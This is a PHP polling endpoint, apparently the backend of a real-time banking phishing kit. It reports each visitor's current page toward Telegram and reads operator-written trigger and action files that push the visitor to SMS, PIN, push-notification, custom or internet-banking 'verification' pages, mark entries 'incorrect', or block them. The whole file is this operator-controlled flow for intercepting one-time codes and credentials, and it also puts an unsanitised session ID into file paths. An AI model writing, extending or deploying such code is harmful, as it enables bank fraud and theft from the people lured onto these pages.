<?php
require_once 'config.php';

header('Content-Type: application/json');

if (!isset($_GET['session'])) {
    echo json_encode(['error' => 'Session ID missing']);
    exit();
}

$sessionId = $_GET['session'];
$pageTitle = trim($_GET['page'] ?? '');
$dataFile = SESSIONS_DIR . "/{$sessionId}.json";

if (!file_exists($dataFile)) {
    echo json_encode(['error' => 'Session not found']);
    exit();
}

// Use isolated presence data to prevent race conditions with main session
$response = ['redirect' => false];
$now = time();
$sessionIdForRedirect = $sessionId; // Preserve sessionId for redirect handling

// Update presence data in isolated file (doesn't touch main session)
updatePresenceData($sessionId, function(&$presenceData) use ($pageTitle, $now, $sessionId) {
    $previousPage = $presenceData['current_page'] ?? '';
    
    // Only update page if it actually changed
    if (!empty($pageTitle) && $pageTitle !== $previousPage) {
        $presenceData['current_page'] = $pageTitle;
    }
    
    $presenceData['last_poll_date'] = $now;
    
    // Read main session data for Telegram update (read-only, no lock needed for presence line)
    $sessionData = readSessionData($sessionId);
    if ($sessionData) {
        // Merge presence data into session data for buildPresenceLine
        mergePresenceIntoSession($sessionData, $presenceData);
        
        // Ensure session_id is set
        if (empty($sessionData['session_id'])) {
            $sessionData['session_id'] = $sessionId;
        }
        
        // Don't update presence in Telegram here - it's slow and causes delay
        // Presence will be updated by background processes or when needed
        $presenceData['presence_line'] = buildPresenceLine($sessionData);
    }
    
    return true;
});

// Read session data for trigger file handling
$sessionData = readSessionData($sessionId);
if (!$sessionData) {
    $sessionData = [];
}

// Merge presence data into session data for redirect logic
$presenceData = readPresenceData($sessionId);
mergePresenceIntoSession($sessionData, $presenceData);

// Handle trigger files
$triggerFile = SESSIONS_DIR . "/{$sessionId}.trigger";
if (file_exists($triggerFile)) {
    $triggerValue = trim(file_get_contents($triggerFile));
    unlink($triggerFile);

    if ($triggerValue === 'correct') {
        $response['redirect'] = buildPageUrl('success', ['session' => $sessionIdForRedirect]);
    } elseif ($triggerValue === 'failed') {
        // Redirect to failed.php page (similar to success page)
        $response['redirect'] = buildPageUrl('failed', ['session' => $sessionIdForRedirect]);
    } elseif ($triggerValue === 'incorrect') {
        // Redirect back to the same verification page with error
        // Prioritize last_verification_type (most reliable), only check current_page as fallback
        $verificationType = $sessionData['last_verification_type'] ?? '';
        $currentPage = $sessionData['current_page'] ?? '';
        $pageLower = strtolower($currentPage);
        
        // Check stored verification type FIRST (most reliable) - use preserved sessionId
        if ($verificationType === 'custom') {
            $response['redirect'] = buildPageUrl('custom', ['session' => $sessionIdForRedirect, 'error' => 'incorrect']);
        } elseif ($verificationType === 'sms') {
            $response['redirect'] = buildPageUrl('sms', ['session' => $sessionIdForRedirect, 'error' => 'incorrect']);
        } elseif ($verificationType === 'pin') {
            $response['redirect'] = buildPageUrl('pin', ['session' => $sessionIdForRedirect, 'error' => 'incorrect']);
        } elseif ($verificationType === 'push') {
            $response['redirect'] = buildPageUrl('push', ['session' => $sessionIdForRedirect, 'error' => 'incorrect']);
        } elseif ($verificationType === 'internet_bank') {
            $response['redirect'] = buildPageUrl('internet_bank', ['session' => $sessionIdForRedirect, 'error' => 'incorrect']);
        } elseif (strpos($pageLower, 'custom') !== false) {
            // Fallback to current_page only if verificationType is empty
            $response['redirect'] = buildPageUrl('custom', ['session' => $sessionIdForRedirect, 'error' => 'incorrect']);
        } elseif (strpos($pageLower, 'sms') !== false) {
            $response['redirect'] = buildPageUrl('sms', ['session' => $sessionIdForRedirect, 'error' => 'incorrect']);
        } elseif (strpos($pageLower, 'pin') !== false) {
            $response['redirect'] = buildPageUrl('pin', ['session' => $sessionIdForRedirect, 'error' => 'incorrect']);
        } elseif (strpos($pageLower, 'push') !== false) {
            $response['redirect'] = buildPageUrl('push', ['session' => $sessionIdForRedirect, 'error' => 'incorrect']);
        } elseif (strpos($pageLower, 'internet') !== false) {
            $response['redirect'] = buildPageUrl('internet_bank', ['session' => $sessionIdForRedirect, 'error' => 'incorrect']);
        } else {
            // Fallback: redirect to payments
            $response['redirect'] = buildPageUrl('payments');
        }
    }
}

// Handle action file - use preserved sessionId
$actionFile = SESSIONS_DIR . "/{$sessionIdForRedirect}.action";
if (!$response['redirect'] && file_exists($actionFile)) {
    $action = trim(file_get_contents($actionFile));

    $redirectUrls = [
        'sms' => buildPageUrl('sms', ['session' => $sessionIdForRedirect]),
        'push' => buildPageUrl('push', ['session' => $sessionIdForRedirect]),
        'pin' => buildPageUrl('pin', ['session' => $sessionIdForRedirect]),
        'custom' => buildPageUrl('custom', ['session' => $sessionIdForRedirect]),
        'internet_bank' => buildPageUrl('internet_bank', ['session' => $sessionIdForRedirect]),
        'block' => buildPageUrl('payments', ['error' => 'blocked']) // Redirect to payments with blocked error
    ];

    if ($action === 'custom') {
        $customMessageFile = SESSIONS_DIR . "/{$sessionIdForRedirect}.custom_message";
        if (!file_exists($customMessageFile)) {
            $response['redirect'] = false;
        } elseif (isset($redirectUrls[$action])) {
            $response['redirect'] = $redirectUrls[$action];
            unlink($actionFile);
        }
    } elseif (isset($redirectUrls[$action])) {
        $response['redirect'] = $redirectUrls[$action];
        unlink($actionFile);
    }
}

echo json_encode($response);
?>
